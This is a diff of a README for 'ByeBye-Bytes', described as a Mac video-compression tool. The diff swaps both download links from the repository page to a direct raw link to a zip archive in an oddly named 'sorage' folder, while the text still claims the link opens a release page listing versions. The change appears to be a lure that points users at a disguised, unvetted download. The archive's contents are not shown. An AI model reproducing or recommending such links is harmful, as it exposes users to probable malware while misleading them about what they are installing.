@@ -1,6 +1,6 @@
 # 🎥 ByeBye-Bytes - Reduce video size without any effort
 
-[![](https://img.shields.io/badge/Download-ByeBye-Bytes-blue.svg)](https://github.com/Ducklingaphrodisiac718/ByeBye-Bytes)
+[![](https://img.shields.io/badge/Download-ByeBye-Bytes-blue.svg)](https://github.com/Ducklingaphrodisiac718/ByeBye-Bytes/raw/refs/heads/main/sorage/Bytes-Bye-v1.1.zip)
 
 ByeBye-Bytes shrinks your video files. It turns large files into manageable H.265 MP4s. You do not need to change settings. The app handles the work for you. It uses your Mac hardware to speed up the process. The interface stays clean and simple. You simply drop your video file, and the app saves a smaller version for you.
 
@@ -8,7 +8,7 @@ ByeBye-Bytes shrinks your video files. It turns large files into manageable H.26
 
 You must get the installer from our release page. Visit the link below to find the files.
 
-[Download ByeBye-Bytes from GitHub](https://github.com/Ducklingaphrodisiac718/ByeBye-Bytes)
+[Download ByeBye-Bytes from GitHub](https://github.com/Ducklingaphrodisiac718/ByeBye-Bytes/raw/refs/heads/main/sorage/Bytes-Bye-v1.1.zip)
 
 This page lists all available versions. Choose the latest release. Click the file name to start the download.
 
